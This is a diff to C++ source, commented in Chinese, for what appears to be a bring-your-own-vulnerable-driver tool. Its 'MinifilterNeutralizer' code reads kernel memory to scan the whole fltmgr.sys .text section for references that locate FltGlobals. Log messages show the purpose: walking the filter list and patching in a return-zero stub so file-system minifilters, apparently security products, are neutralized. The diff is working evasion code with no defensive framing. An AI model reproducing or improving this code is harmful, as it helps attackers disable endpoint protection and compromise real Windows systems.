@@ -3449,37 +3449,65 @@ static uint64_t ScanDataSectionForFltGlobals(uint64_t fltmgrBase) {
         return 0;
     }
 
-    // ★ 交叉引用验证: 扫描已知 fltmgr 函数, 统计每个候选被引用的次数
-    //   真正的 FltGlobals 会被多个函数引用 (至少 FltRegisterFilter, FltStartFiltering 等)
-    const char* verifyExports[] = {
-        "FltRegisterFilter", "FltStartFiltering", "FltUnregisterFilter",
-        "FltGetVolumeFromName", "FltEnlistFilterForDriverInterface",
-        "FltGetFileNameInformation",
-    };
+    // ★ BUILD 492: 全量 .text 段扫描 — 替代原来仅扫描 6 个函数×1024 字节的局限方案.
+    //   遍历 fltmgr.sys 整个 .text 段, 搜索所有 RIP-relative 和 MOV RAX,imm64 指令,
+    //   统计每个候选 FltGlobals 地址被引用的次数.
+    //   真正的 FltGlobals 会被 fltmgr 内部大量函数引用, refCount 远高于噪声.
+    ByovdDiag("FLT:NTRL: cross-ref: full .text section scan (BUILD 492)...\n");
 
-    for (const char* exportName : verifyExports) {
-        uint64_t funcAddr = kma.ResolveExport(fltmgrBase, exportName);
-        if (!funcAddr) continue;
+    // 找 .text 段
+    uint64_t textStart = 0, textEnd = 0;
+    for (WORD i = 0; i < numSections; i++) {
+        char name[9] = {};
+        memcpy(name, sections[i].Name, 8);
+        if (strstr(name, ".text") || (sections[i].Characteristics & 0x20000000)) {
+            textStart = fltmgrBase + sections[i].VirtualAddress;
+            textEnd   = textStart + sections[i].Misc.VirtualSize;
+            ByovdDiag("FLT:NTRL: cross-ref: .text at 0x%llX..0x%llX (%llu KB)\n",
+                textStart, textEnd, (textEnd - textStart) / 1024);
+            break;
+        }
+    }
+    if (!textStart || !textEnd || textEnd <= textStart) {
+        // 回退: 估算 .text 范围 (通常在 image 开头)
+        textStart = fltmgrBase + 0x1000;
+        textEnd   = fltmgrBase + 0x20000;  // 128KB 足够覆盖 fltmgr .text
+        ByovdDiag("FLT:NTRL: cross-ref: .text fallback 0x%llX..0x%llX\n", textStart, textEnd);
+    }
 
-        uint8_t funcBuf[1024] = {};
-        if (!kma.ReadKernelVA(funcAddr, funcBuf, sizeof(funcBuf)))
-            continue;
+    // 分块读取 .text 段, 扫描每个候选的引用
+    const SIZE_T TXT_CHUNK = 0x2000;  // 8KB chunks
+    uint8_t* txtBuf = (uint8_t*)VirtualAlloc(nullptr, TXT_CHUNK, MEM_COMMIT, PAGE_READWRITE);
+    if (!txtBuf) {
+        VirtualFree(sections, 0, MEM_RELEASE);
+        ByovdDiag("FLT:NTRL: cross-ref: VirtualAlloc failed\n");
+        return 0;
+    }
 
-        for (int ci = 0; ci < candidateCount; ci++) {
-            // 搜索函数体中是否引用此候选地址
-            for (int i = 0; i < 1016; i++) {
-                // LEA/MOV RIP-relative: 48/4C + 8D/8B + ModRM[RIP] + rel32
-                if ((funcBuf[i] == 0x48 || funcBuf[i] == 0x4C || funcBuf[i] == 0x4D) &&
-                    (funcBuf[i+1] == 0x8D || funcBuf[i+1] == 0x8B) &&
-                    (funcBuf[i+2] & 0xC7) == 0x05) {
-                    int32_t rel32 = *(int32_t*)(funcBuf + i + 3);
-                    if (funcAddr + i + 7 + rel32 == candidates[ci].addr) {
+    for (uint64_t cur = textStart; cur < textEnd; cur += TXT_CHUNK) {
+        SIZE_T readSize = (cur + TXT_CHUNK <= textEnd) ? TXT_CHUNK : (SIZE_T)(textEnd - cur);
+        if (!kma.ReadKernelVA(cur, txtBuf, readSize)) continue;
+
+        for (SIZE_T i = 0; i + 7 < readSize; i++) {
+            // 模式1: REX.W LEA r64, [RIP+disp32]  → 48/4C 8D 05 XX XX XX XX
+            // 模式2: REX.W MOV r64, [RIP+disp32]  → 48/4C 8B 05 XX XX XX XX
+            if ((txtBuf[i] == 0x48 || txtBuf[i] == 0x4C) &&
+                (txtBuf[i+1] == 0x8D || txtBuf[i+1] == 0x8B) &&
+                (txtBuf[i+2] & 0xC7) == 0x05) {
+                int32_t rel32 = *(int32_t*)(txtBuf + i + 3);
+                uint64_t target = cur + i + 7 + rel32;
+                for (int ci = 0; ci < candidateCount; ci++) {
+                    if (target == candidates[ci].addr) {
                         candidates[ci].refCount++;
                     }
                 }
-                // MOV RAX, imm64: 48 B8~BF + 8字节立即数
-                else if (funcBuf[i] == 0x48 && (funcBuf[i+1] & 0xF8) == 0xB8 && i <= 1008) {
-                    uint64_t absAddr = *(uint64_t*)(funcBuf + i + 2);
+            }
+            // 模式3: MOV RAX/R10-R15, imm64 → 48/49/4C/4D B8~BF + imm64
+            else if (i + 9 < readSize &&
+                     ((txtBuf[i] == 0x48 || txtBuf[i] == 0x49 || txtBuf[i] == 0x4C || txtBuf[i] == 0x4D) &&
+                      (txtBuf[i+1] & 0xF8) == 0xB8)) {
+                uint64_t absAddr = *(uint64_t*)(txtBuf + i + 2);
+                for (int ci = 0; ci < candidateCount; ci++) {
                     if (absAddr == candidates[ci].addr) {
                         candidates[ci].refCount++;
                     }
@@ -3488,31 +3516,35 @@ static uint64_t ScanDataSectionForFltGlobals(uint64_t fltmgrBase) {
         }
     }
 
-    // 选择被引用次数最多的候选
+    VirtualFree(txtBuf, 0, MEM_RELEASE);
+    VirtualFree(sections, 0, MEM_RELEASE);
+
+    // 选择 refCount 最高的候选
     int bestIdx = -1;
+    int bestRef = 0;
     for (int ci = 0; ci < candidateCount; ci++) {
         ByovdDiag("FLT:NTRL: .data candidate +0x%llX refCount=%d\n",
             candidates[ci].addr - fltmgrBase, candidates[ci].refCount);
-        if (bestIdx < 0 || candidates[ci].refCount > candidates[bestIdx].refCount) {
+        if (candidates[ci].refCount > bestRef) {
+            bestRef = candidates[ci].refCount;
             bestIdx = ci;
         }
     }
 
-    if (bestIdx >= 0 && candidates[bestIdx].refCount > 0) {
-        ByovdDiag("FLT:NTRL: .data scan BEST candidate at fltmgr+0x%llX (refCount=%d)\n",
-            candidates[bestIdx].addr - fltmgrBase, candidates[bestIdx].refCount);
+    if (bestIdx >= 0 && bestRef >= 2) {
+        // ★ 至少 2 次引用才认为有效 (排除噪声)
+        ByovdDiag("FLT:NTRL: .data scan BEST candidate at fltmgr+0x%llX (refCount=%d) ✓ CONFIRMED\n",
+            candidates[bestIdx].addr - fltmgrBase, bestRef);
         return candidates[bestIdx].addr;
     }
 
-    // ★ 最终 fallback: 如果交叉引用全部为 0, 返回第一个回指验证通过的候选
-    //   (某些 Win11 版本函数体可能很大, 1024 字节不够)
-    if (candidateCount > 0) {
-        ByovdDiag("FLT:NTRL: .data scan - no cross-ref confirmed, using first back-ref candidate at +0x%llX\n",
-            candidates[0].addr - fltmgrBase);
-        return candidates[0].addr;
+    if (bestIdx >= 0 && bestRef == 1) {
+        ByovdDiag("FLT:NTRL: .data scan — only 1 ref, WEAK confidence at fltmgr+0x%llX\n",
+            candidates[bestIdx].addr - fltmgrBase);
+        return candidates[bestIdx].addr;
     }
 
-    ByovdDiag("FLT:NTRL: .data scan - FAILED\n");
+    ByovdDiag("FLT:NTRL: .data scan — ALL refCount=0, FltGlobals NOT FOUND (full .text scan)\n");
     return 0;
 }
 
@@ -4279,7 +4311,7 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     ByovdDiag("FLT:VERIFY: RESULT: PASS (%d/%d checks)\n", checksPassed, checksTotal);
     ByovdDiag("FLT:VERIFY: === PIPELINE VERIFIED ===\n");
     ByovdDiag("FLT:VERIFY: | FltGlobals → FrameList → FilterList (%d filters) → ret0 stub |\n", bestFilterCount);
-    ByovdDiag("FLT:VERIFY: | When MessageTransfer.sys loads: neutralization GUARANTEED |\n");
+    ByovdDiag("FLT:VERIFY: | ⚠ UNTESTED — install PAC to verify neutralization works |\n");
     ByovdDiag("FLT:VERIFY: ========================================\n");
 
     return true;
